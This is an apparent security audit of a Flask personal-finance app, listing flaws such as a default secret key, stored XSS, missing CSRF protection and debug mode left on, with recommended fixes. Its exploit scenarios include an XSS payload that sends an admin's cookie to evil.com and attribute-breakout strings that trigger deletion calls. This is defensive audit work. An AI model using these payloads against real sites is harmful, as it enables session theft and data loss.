# MTracker — Full Security & Architecture Audit

**Date**: July 3, 2026  
**Scope**: All application code, templates, database schema, configuration, and dependencies.

---

## CRITICAL — Zero-Day / Immediate Exploit

### 1. Flask Secret Key Is Default (CWE-798)
**`app.py:18`** `app.secret_key = 'your_secret_key_here'`

Flask signs session cookies with this key. With a known key, any attacker can forge arbitrary session cookies — impersonate any user, gain admin access. Since Flask uses **client-side sessions** by default, the full session payload is in the cookie. This is the single highest-impact vulnerability.

### 2. Stored XSS Across Every User-Entered Field (CWE-79)
The entire frontend builds HTML via template literals and injects it with jQuery `.html()` / `.append()` / `.innerHTML`. **No sanitization anywhere.** Every field listed below can contain `<script>`, `<img onerror>`, etc.:

| Field | Injection Point |
|---|---|
| `item.reason` | Paid, personal, pending, long pending entries |
| `item.category` | Category badges, dropdowns, filter options |
| `item.account` | Account cells, opening balance labels |
| `item.source` | Income source |
| `note.title`, `note.content` | Note cards |
| `user.name` | In `onerror` of profile pics, `onclick` strings, PDF export |

**Exploit scenario**: Register with name `x' onfocus='fetch("https://evil.com/steal?c="+document.cookie)` — when an admin views the user list, the payload executes in the admin's session.

### 3. No CSRF Protection on Any State-Changing Endpoint (CWE-352)
**Every** POST, PUT, DELETE across the entire application lacks CSRF tokens:
- `/api/save` (persists all financial data)
- `/api/update_password`, `/api/send_otp`, `/api/verify_otp`
- `/api/forgot_password/send`, `/api/forgot_password/reset`
- All category/account CRUD
- All admin operations (`toggle_user`, `toggle_admin`, `delete_user`)
- Login and registration forms

**Exploit scenario**: Host a page that submits a hidden form to `http://mtracker.local/api/update_password` with a known password — when the victim visits, their password is changed.

### 4. Debug Mode Exposed on All Interfaces (CWE-215)
**`app.py:1052`** `app.run(debug=True, host='0.0.0.0')`

The Werkzeug debugger enables **remote code execution** on any unhandled exception. The interactive console has no authentication. Binding to `0.0.0.0` makes it accessible from the network. This is game-over compromise if triggered.

### 5. OTP Leak for Phone-Based Password Reset
**`app.py:262`** `return jsonify({"status": "success", ..., "otp_mock": otp})`

The 6-digit OTP is returned in the HTTP response body for phone identifiers. Anyone who can observe the response (browser dev tools, proxy, network monitor) gets the OTP. Additionally, `random.randint()` (not `secrets.randbelow()`) is used — Python's `random` module is predictable if the PRNG state is known.

### 6. OTP Oracle Enables User Enumeration (CWE-203)
**`app.py:237-238`** returns `"User not found"` vs `"Recovery code sent"` based on whether the identifier exists. An attacker can systematically check which emails/phones are registered.

### 7. Database Credentials Printed to Console
**`app.py:30`** `print(f"DB_Config: {DB_CONFIG}")` — MySQL root password is written to stdout on every startup, visible in systemd journal, logs, etc.

### 8. AI Chat XSS via `marked.parse()` → `innerHTML` (CWE-79)
**`chat_widget.html:301`**, **`chat.html:198`**
```javascript
agentDiv.innerHTML = '<div class="markdown">' + marked.parse(data.reply) + '</div>';
```
`marked` does **not** sanitize HTML by default. If the AI model's response contains `<script>`, it executes. This can be triggered via **prompt injection** in the chat widget.

---

## HIGH Severity

### 9. Jinja2 Auto-escape Bypass via `onerror` / `onclick` Attributes
**`admin.html:167`**, **`index.html:321,364`**, **`profile.html:160,203,259`**
```html
onerror="this.src='https://ui-avatars.com/api/?name={{ current_user.name }}'"
```
`{{ }}` auto-escapes HTML characters but does **not** protect JS string context. A name containing `'` breaks out of the attribute. Example: name = `x' onerror='alert(1)` produces:
```html
onerror="this.src='...?name=x' onerror='alert(1)'"
```
The second `onerror` fires with `alert(1)`.

### 10. Account Names Injected into JS Strings (CWE-79)
**`index.html:1833-1834`**
```javascript
onchange="updateOpeningBalance('${acc}', this.value)"
```
Account names from the database are directly interpolated into `onchange` handlers. An account named `Test' onfocus='fetch("/api/delete_month")` executes when the input is focused.

### 11. No Rate Limiting on Any Authentication Endpoint
- `/login` — unlimited brute force
- `/api/forgot_password/send` — unlimited OTP generation
- `/api/forgot_password/reset` — unlimited OTP guess (6-digit = 1M combos)
- `/api/verify_password` — unlimited session-authenticated password verification
- `/api/send_otp`, `/api/verify_otp` — unlimited OTP operations

### 12. SVG Profile Picture Upload XSS (CWE-79)
**`app.py:811`** No file extension/content validation. An `.svg` file with `<script>` inside serves from the same origin and executes in any viewer's browser.

### 13. No HTTP Security Headers
None of these are set:
- `Content-Security-Policy` — would prevent most XSS
- `X-Content-Type-Options: nosniff`
- `X-Frame-Options: DENY`
- `Strict-Transport-Security`
- `Referrer-Policy`
- `X-XSS-Protection`

### 14. No Session Cookie Security Flags
**`app.py`** does not set:
- `SESSION_COOKIE_HTTPONLY` — session cookie accessible to JavaScript (XSS can steal it)
- `SESSION_COOKIE_SECURE` — cookie sent over HTTP (not just HTTPS)
- `SESSION_COOKIE_SAMESITE` — no CSRF protection via cookie attribute

### 15. API Keys Exposed in `.env` (Plaintext)
| Key | Service |
|---|---|
| `GOOGLE_API_KEY` | Google Cloud |
| `NVIDIA_API_KEY` | NVIDIA AI |
| `XAI_API_KEY` | xAI (Grok) |
| `OPENROUTER_API_KEY` | OpenRouter |

### 16. MySQL Root User for Application
**`.env:2`** user=root. The app has full DDL/DML access. Schema includes a commented-out restricted user (`m_tracker_app` at schema:634) that is never used.

### 17. `user.default_account_id` Injected into JS (CWE-79)
**`index.html:1285`**
```javascript
const DEFAULT_ACCOUNT_ID = "{{ user.default_account_id or '' }}";
```
If the profile data is tampered with or the ID contains `"`, this breaks the JS context.

---

## MEDIUM Severity

### 18. No Connection Pooling
Every API call creates a new TCP+TLS connection to MySQL. `database_controller.py` uses `mysql.connector.connect()` per method with no `pool_name`. Performance degradation and potential connection exhaustion under load.

### 19. No Transaction Isolation in `save_month_data()`
**`database_controller.py:417-487`** The clear-and-reinsert pattern runs outside an explicit transaction with isolation. Concurrent requests for the same month cause partial data loss (one request's deletes + other's inserts interleave).

### 20. CSV Import Memory Exhaustion (DoS)
**`app.py:567`** `rows = list(csv_input)` loads entire CSV into memory. No file size limit beyond Flask's 16 MB default. No row count limit.

### 21. CSV Import ID Collision
**`app.py:620`** `"id": i` — row index as expense ID. Multiple imports overwrite each other's records via `ON DUPLICATE KEY UPDATE`.

### 22. All CDN Dependencies Lack SRI Hashes
**All templates** load from CDN (jQuery, Tailwind, Chart.js, html2pdf, Lucide, marked) without `integrity` attributes. A compromised CDN or MITM injects malicious code into every page. `lucide@latest` is unpinned — it auto-upgrades to any new version.

### 23. Flask-Mail 0.9.1 (Unmaintained Since 2015)
**`requirements.txt:3`** No security patches in ~11 years. No official CVEs tracked, but unmaintained = indefinite risk.

### 24. SMTP Credentials Potentially in Plaintext
**`mtracker_schema.sql:278-281`** The `system_settings` table stores SMTP username/password in plaintext `VARCHAR(255)`. Admin panel displays password as `******` but database stores it as-is.

### 25. No Audit Logging
**`mtracker_schema.sql:304-321`** An `audit_log` table exists in the schema but is **never written to** by any application code. Admin actions (user toggle, delete, setting changes) leave no forensic trail.

### 26. Session Re-fetch of Password Hash
**`database_controller.py:40`** `SELECT * FROM users` returns `password_hash` on every `load_user()` call (every request). While Flask-Login only stores user ID in the session, the hash is fetched and loaded into a User object on every page load.

### 27. No Email Verification on Registration
**`app.py:343`** Auto-logs in the user immediately after registration with no email/phone verification. No confirmation link, no OTP.

---

## LOW Severity

### 28. Hardcoded Schema Debugging Statements
Several stored procedures still have `SELECT 'Error: Long Pending not found or closed';` and similar diagnostic output. These would be returned as result sets to the application if executed.

### 29. Dead Stored Procedure: `sp_pay_pending_expense`
**`mtracker_schema.sql:488-524`** Defined but never called from any Python code.

### 30. `venv/` Not in `.gitignore`
The virtual environment directory is present but not gitignored. It won't be pushed (too large) but `git status` always shows it as untracked.

### 31. Systemd Service Runs on Port 80 Without Reverse Proxy
**`mtracker.service:8`** ExecStart runs on port 80. No nginx/Caddy in front for TLS termination, rate limiting, or request filtering.

### 32. No `PERMANENT_SESSION_LIFETIME`
No session timeout configured. Session cookies persist indefinitely (until browser close for default session, or until cookie expiry for permanent).

---

## Architecture-Level Observations

| Area | Finding | Impact |
|---|---|---|
| **Data flow** | Full-state save (`POST /api/save` sends entire month object) | Race condition: two browser tabs overwrite each other's changes |
| **Client state** | `currentData` is the single source of truth; server data is a snapshot | If save fails after local mutation, the UI is out of sync with the database |
| **ID generation** | `Date.now()` stringified as IDs | Collisions possible if two items created in same ms; IDs are predictable |
| **ID types** | MySQL INT vs JS number: `String(a.id) === String(id)` | Works but fragile; implicit type coercion is a maintenance hazard |
| **Error recovery** | All API errors show `alert()` dialog | No retry mechanism, no auto-save, no offline queue |
| **Testing** | Zero tests | Every change risks regression; no CI |
| **Build pipeline** | None — CDN-driven, no bundler, no minification | Supply chain risk; no tree-shaking; `@latest` on CDN is dangerous |
| **DB partitioning** | `months` has `month_key VARCHAR(7)` with no composite index on `(user_id, month_key)` | Query performance degrades with large datasets |

---

## Top 5 Actions to Fix First

1. **Set a real Flask `secret_key`** — read from env var or generate with `os.urandom(24)`.
2. **Disable debug mode** — `debug=False` (or remove the `if __name__` block entirely in production).
3. **Install a CSP header** — `Content-Security-Policy: default-src 'self' https:; script-src 'self' https: 'unsafe-inline'` — blocks most XSS.
4. **Mask OTP oracle** — return `"Recovery code sent if account exists"` for both found and not-found identifiers; remove `otp_mock` from responses.
5. **Sanitize user input** — at minimum, escape `'` and `"` in account names and item reasons before injecting into JS `onclick`/`onchange` strings.
